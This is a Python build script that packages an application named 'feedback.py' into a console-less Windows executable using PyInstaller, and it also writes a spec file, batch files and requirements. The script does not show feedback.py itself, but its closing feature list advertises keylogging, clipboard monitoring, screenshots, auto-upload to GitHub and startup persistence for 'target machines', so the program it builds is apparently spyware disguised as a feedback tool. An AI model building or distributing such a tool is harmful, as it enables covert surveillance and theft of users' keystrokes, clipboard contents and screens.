#!/usr/bin/env python3
"""
Compilation script for feedback.py with multi-monitor screenshot support
This script compiles the feedback application into a standalone executable
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path

def check_dependencies():
    """Check if all required packages are installed"""
    required_packages = [
        'pyinstaller',
        'pillow',
        'pyautogui', 
        'pyperclip',
        'pynput',
        'plyer',
        'pystray',
        'psutil',
        'requests',
        'pygetwindow',
        'pywin32'  # This includes win32gui, win32ui, win32api, win32con
    ]
    
    missing_packages = []
    
    for package in required_packages:
        try:
            if package == 'pillow':
                import PIL
            elif package == 'pywin32':
                import win32gui
                import win32ui
                import win32api
                import win32con
            else:
                __import__(package)
            print(f"✅ {package} - OK")
        except ImportError:
            missing_packages.append(package)
            print(f"❌ {package} - MISSING")
    
    if missing_packages:
        print(f"\n⚠️ Missing packages: {', '.join(missing_packages)}")
        print("Install them using:")
        for package in missing_packages:
            print(f"  pip install {package}")
        return False
    
    print("\n✅ All dependencies are installed!")
    return True

def create_spec_file():
    """Create a custom .spec file for PyInstaller with all necessary configurations"""
    
    spec_content = '''# -*- mode: python ; coding: utf-8 -*-

import sys
import os
from PyInstaller.utils.hooks import collect_data_files, collect_submodules

# Collect all necessary data files and hidden imports
datas = []
hiddenimports = []

# Add PIL/Pillow data files
datas += collect_data_files('PIL')

# Add plyer data files for notifications
try:
    datas += collect_data_files('plyer')
except:
    pass

# Add pystray data files
try:
    datas += collect_data_files('pystray')
except:
    pass

# Hidden imports for multi-monitor support and other features
hiddenimports += [
    'win32gui',
    'win32ui', 
    'win32api',
    'win32con',
    'win32clipboard',
    'win32process',
    'win32event',
    'win32file',
    'pywintypes',
    'PIL._tkinter_finder',
    'PIL.Image',
    'PIL.ImageDraw',
    'PIL.ImageTk',
    'tkinter',
    'tkinter.ttk',
    'tkinter.messagebox',
    'tkinter.filedialog',
    'pynput.keyboard',
    'pynput.mouse',
    'pyautogui',
    'pyperclip',
    'psutil',
    'requests',
    'plyer.platforms.win.notification',
    'pystray._win32',
    'pygetwindow',
    'ctypes.wintypes',
    'json',
    'base64',
    'threading',
    'logging',
    'datetime',
    'uuid',
    'socket',
    'platform',
    'webbrowser',
    'subprocess',
    'winreg',
    'getpass',
    'io',
    'time',
    'os',
    'sys'
]

# Collect all submodules for critical packages
try:
    hiddenimports += collect_submodules('win32gui')
    hiddenimports += collect_submodules('win32ui')
    hiddenimports += collect_submodules('win32api')
    hiddenimports += collect_submodules('PIL')
    hiddenimports += collect_submodules('pynput')
    hiddenimports += collect_submodules('plyer')
    hiddenimports += collect_submodules('pystray')
except:
    pass

a = Analysis(
    ['feedback.py'],
    pathex=[],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'numpy',
        'scipy',
        'pandas',
        'jupyter',
        'IPython',
        'notebook'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=None,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=None)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='feedback',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Set to True for debugging, False for production
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='assets/image/icon.ico'  # Add icon if available
)
'''
    
    with open('feedback.spec', 'w') as f:
        f.write(spec_content)
    
    print("✅ Created feedback.spec file")

def create_build_script():
    """Create a batch file for easy compilation"""
    
    batch_content = '''@echo off
echo ================================================
echo    Feedback Application Compilation Script
echo ================================================
echo.

echo Checking Python installation...
python --version
if %errorlevel% neq 0 (
    echo ERROR: Python is not installed or not in PATH
    pause
    exit /b 1
)

echo.
echo Checking PyInstaller installation...
python -c "import PyInstaller; print('PyInstaller version:', PyInstaller.__version__)"
if %errorlevel% neq 0 (
    echo ERROR: PyInstaller is not installed
    echo Installing PyInstaller...
    pip install pyinstaller
)

echo.
echo Starting compilation process...
echo This may take several minutes...

REM Clean previous builds
if exist "build" rmdir /s /q "build"
if exist "dist" rmdir /s /q "dist"
if exist "feedback.exe" del "feedback.exe"

echo.
echo Compiling with PyInstaller...
pyinstaller feedback.spec --clean --noconfirm

if %errorlevel% equ 0 (
    echo.
    echo ================================================
    echo    COMPILATION SUCCESSFUL!
    echo ================================================
    echo.
    echo The executable has been created in the 'dist' folder
    echo File: dist/feedback.exe
    echo.
    
    REM Copy the executable to current directory for convenience
    if exist "dist/feedback.exe" (
        copy "dist\\feedback.exe" "feedback.exe"
        echo Copied feedback.exe to current directory
    )
    
    echo.
    echo Creating assets folder structure...
    if not exist "assets" mkdir "assets"
    if not exist "assets\\image" mkdir "assets\\image"
    if not exist "assets\\schedule" mkdir "assets\\schedule"
    
    echo.
    echo Build completed successfully!
    echo You can now run feedback.exe
    
) else (
    echo.
    echo ================================================
    echo    COMPILATION FAILED!
    echo ================================================
    echo.
    echo Please check the error messages above
    echo Common issues:
    echo - Missing dependencies (run: pip install -r requirements.txt)
    echo - Antivirus blocking PyInstaller
    echo - Insufficient disk space
)

echo.
pause
'''
    
    with open('build_feedback.bat', 'w') as f:
        f.write(batch_content)
    
    print("✅ Created build_feedback.bat script")

def create_requirements_file():
    """Create requirements.txt with all necessary packages"""
    
    requirements = '''# Core dependencies for feedback.py
pyinstaller>=5.0
pillow>=9.0.0
pyautogui>=0.9.54
pyperclip>=1.8.2
pynput>=1.7.6
plyer>=2.1.0
pystray>=0.19.4
psutil>=5.9.0
requests>=2.28.0
pygetwindow>=0.0.9
pywin32>=304

# Additional Windows-specific packages
pywin32-ctypes>=0.2.0
comtypes>=1.1.14

# Optional but recommended
setuptools>=65.0.0
wheel>=0.37.0
'''
    
    with open('requirements.txt', 'w') as f:
        f.write(requirements)
    
    print("✅ Created requirements.txt")

def create_install_script():
    """Create a script to install all dependencies"""
    
    install_script = '''@echo off
echo ================================================
echo    Installing Feedback Application Dependencies
echo ================================================
echo.

echo Upgrading pip...
python -m pip install --upgrade pip

echo.
echo Installing required packages...
pip install -r requirements.txt

echo.
echo Verifying installation...
python compile_feedback.py --check-only

echo.
echo Installation complete!
echo You can now run: python compile_feedback.py
pause
'''
    
    with open('install_dependencies.bat', 'w') as f:
        f.write(install_script)
    
    print("✅ Created install_dependencies.bat")

def compile_application():
    """Compile the application using PyInstaller"""
    
    print("\n🔨 Starting compilation process...")
    
    # Clean previous builds
    if os.path.exists('build'):
        shutil.rmtree('build')
        print("🧹 Cleaned build directory")
    
    if os.path.exists('dist'):
        shutil.rmtree('dist')
        print("🧹 Cleaned dist directory")
    
    # Create the spec file
    create_spec_file()
    
    # Run PyInstaller
    try:
        print("🔨 Running PyInstaller...")
        result = subprocess.run([
            sys.executable, '-m', 'PyInstaller',
            'feedback.spec',
            '--clean',
            '--noconfirm'
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print("✅ Compilation successful!")
            
            # Check if executable was created
            exe_path = os.path.join('dist', 'feedback.exe')
            if os.path.exists(exe_path):
                # Copy to current directory
                shutil.copy2(exe_path, 'feedback.exe')
                print(f"✅ Executable created: feedback.exe")
                
                # Get file size
                size_mb = os.path.getsize('feedback.exe') / (1024 * 1024)
                print(f"📦 File size: {size_mb:.1f} MB")
                
                return True
            else:
                print("❌ Executable not found in dist folder")
                return False
        else:
            print("❌ Compilation failed!")
            print("STDOUT:", result.stdout)
            print("STDERR:", result.stderr)
            return False
            
    except Exception as e:
        print(f"❌ Error during compilation: {e}")
        return False

def create_folder_structure():
    """Create necessary folder structure"""
    
    folders = [
        'assets',
        'assets/image', 
        'assets/schedule',
        'logs',
        'screenshots'
    ]
    
    for folder in folders:
        os.makedirs(folder, exist_ok=True)
        print(f"📁 Created folder: {folder}")

def main():
    """Main compilation function"""
    
    print("=" * 60)
    print("    FEEDBACK APPLICATION COMPILATION SCRIPT")
    print("    Multi-Monitor Screenshot Support Included")
    print("=" * 60)
    
    # Check command line arguments
    if len(sys.argv) > 1 and sys.argv[1] == '--check-only':
        return check_dependencies()
    
    # Check if feedback.py exists
    if not os.path.exists('feedback.py'):
        print("❌ feedback.py not found in current directory!")
        return False
    
    print("✅ Found feedback.py")
    
    # Check dependencies
    print("\n📋 Checking dependencies...")
    if not check_dependencies():
        print("\n❌ Please install missing dependencies first:")
        print("   Run: pip install -r requirements.txt")
        return False
    
    # Create all necessary files
    print("\n📝 Creating compilation files...")
    create_requirements_file()
    create_spec_file()
    create_build_script()
    create_install_script()
    
    # Create folder structure
    print("\n📁 Creating folder structure...")
    create_folder_structure()
    
    # Compile the application
    success = compile_application()
    
    if success:
        print("\n" + "=" * 60)
        print("    COMPILATION COMPLETED SUCCESSFULLY!")
        print("=" * 60)
        print("\n📦 Your executable is ready: feedback.exe")
        print("\n🚀 Features included:")
        print("   ✅ Multi-monitor screenshot support")
        print("   ✅ Keylogging functionality")
        print("   ✅ Clipboard monitoring")
        print("   ✅ System tray integration")
        print("   ✅ Auto-upload to GitHub")
        print("   ✅ Auto-update functionality")
        print("   ✅ Startup integration")
        print("   ✅ Configuration management")
        print("\n💡 Tips:")
        print("   - Test the multi-monitor feature using the tray menu")
        print("   - The executable includes all necessary dependencies")
        print("   - No additional installation required on target machines")
        
    else:
        print("\n" + "=" * 60)
        print("    COMPILATION FAILED!")
        print("=" * 60)
        print("\n🔧 Troubleshooting:")
        print("   1. Run: install_dependencies.bat")
        print("   2. Check antivirus settings (may block PyInstaller)")
        print("   3. Ensure sufficient disk space")
        print("   4. Try running as administrator")
    
    return success

if __name__ == "__main__":
    main()